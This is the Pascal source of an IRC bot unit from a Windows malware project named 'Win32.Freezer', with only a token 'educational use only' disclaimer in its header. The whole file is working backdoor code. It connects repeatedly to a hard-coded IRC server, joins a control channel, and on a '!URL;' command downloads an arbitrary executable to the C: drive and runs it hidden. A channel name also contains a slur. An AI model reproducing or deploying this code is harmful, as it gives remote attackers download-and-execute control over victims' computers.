   {

   Project: Win32.Freezer
   Version: 1.4
   Author: Bobfan
   Info: The little brother of Friendly is born! =)
   Note: PLEASE USE FOR EDUCTIONAL USE ONLY!
   File: ircbot.pas (IRC-Bot Unit)

   }

   Unit ircbot;
   interface

   Uses Windows, Winsock, ShellApi;
    Var
     Str01 : string;
     Sock1 : TSocket;
     SockInfo : SockAddr_In;
     WSADATA : TWSAData;
     BUF : Array[0..65536] of char;

    function DLF(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';
    Procedure IrcBot_Start;
   implementation

    FUNCTION getip(HostName:STRING) : STRING;
    LABEL Abort;
    TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
    VAR
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     PPtr       : PAPInAddr;
     I          : Integer;
    BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
      HostEntPtr:=GetHostByName(PChar(HostName));
      IF HostEntPtr=NIL THEN GOTO Abort;
      PPtr:=PAPInAddr(HostEntPtr^.h_addr_list);
      I:=0;
      WHILE PPtr^[I]<>NIL DO BEGIN
       IF HostName='' THEN BEGIN
        IF(Pos('169',inet_ntoa(PPtr^[I]^))<>1)AND(Pos('192',inet_ntoa(PPtr^[I]^))<>1) THEN BEGIN
         Result:=inet_ntoa(PPtr^[I]^);
         GOTO Abort;
        END;
       END ELSE
      RESULT:=(inet_ntoa(PPtr^[I]^));
      Inc(I);
     END;
     Abort:
    EXCEPT
    END;
   WSACleanUp();
   END;

    function IntToStr(X: integer): string;
    var
     TAPInAddr: string;
    begin
     Str(X, TAPInAddr);
     Result := TAPInAddr;
    end;

    Procedure ReadString;
    var
     Answer : String;
     tmp1, tmp2, tmp3:string;
    Begin
     ZeroMemory(@Str01, SizeOf(Str01));
     Str01 := BUF;
     ZeroMemory(@BUF, SizeOf(BUF));
     If POS('PING', Str01)>0 Then Begin
      Answer := Copy( Str01, Pos('PING',Str01) + 6, length(Str01));
      Answer := Copy(Answer, 1, pos(#13#10, Answer)-1);
      Answer := 'PONG :' + Answer + #13#10;
      Send( Sock1, Answer[1], Length(Answer), 0);
     end;
     If POS('MOTD',Str01)>0 then begin
      Answer := 'JOIN #dertunnel '+ #13#10;
      Send( Sock1, Answer[1], Length(Answer), 0);
     end;
     IF POS('!URL;', Str01)>0 Then Begin
      tmp1 := copy(Str01, pos('!URL;', Str01)+5, length(Str01));
      tmp2 := copy(tmp1, pos(';', tmp1)+1, length(tmp1));
      tmp1 := copy(tmp1, 1, pos(';', tmp1)-1);
      tmp2 := copy(tmp2, 1, pos(';', tmp2)-1);
      Randomize;
      if tmp1 = '' then begin
       tmp3 := 'C:\dl'+inttostr(random(999))+'.exe';
       Answer := 'PRIVMSG #youstupidfag :Downloading.'+#13#10;
       Send( Sock1, Answer[1], Length(Answer), 0);
       DLF(0, pChar(tmp2), pChar(tmp3), 0, 0);
       Answer := 'PRIVMSG #youstupidfag :Executing.'+#13#10;
       Send( Sock1, Answer[1], Length(Answer), 0);
       ShellExecute(0, 'open' , pchar(tmp3), nil, nil, 0);
      end;
     end;
    End;

    Procedure IrcBot_Start;
    var
     Answer : String;
     Nick   : String;
    begin
     While 1<>2 Do Begin
      Nick := 'Nate';
      Randomize;
      While Length(Nick)<12 Do
       Nick := Nick + IntToStr(Random(9));
      WSAStartup(257,WSADATA);
      SockInfo.sin_family:=PF_INET;
      SockInfo.sin_port:=htons(6667);
      SockInfo.sin_addr.S_addr:= inet_addr(PChar(getip('irc.after-all.org')));
      Sock1 := socket(PF_INET,SOCK_STREAM,0);
      Connect(Sock1,SockInfo,sizeof(SockInfo));
      Answer := 'USER '+Nick+' '+Nick+'@foo.bar '+Nick+' '+Nick+#13#10;
      Send(Sock1, Answer[1], Length(Answer), 0);
      Answer := 'Nick '+Nick+#13#10;
      Send(Sock1, Answer[1], Length(Answer), 0);
      While 1<>2 do begin
       if (recv(Sock1,BUF,SizeOf(BUF),0)) >= 1 then begin // IF DATA THEN
        ReadString;
       end;
      end;
     end;
    end;

   end.
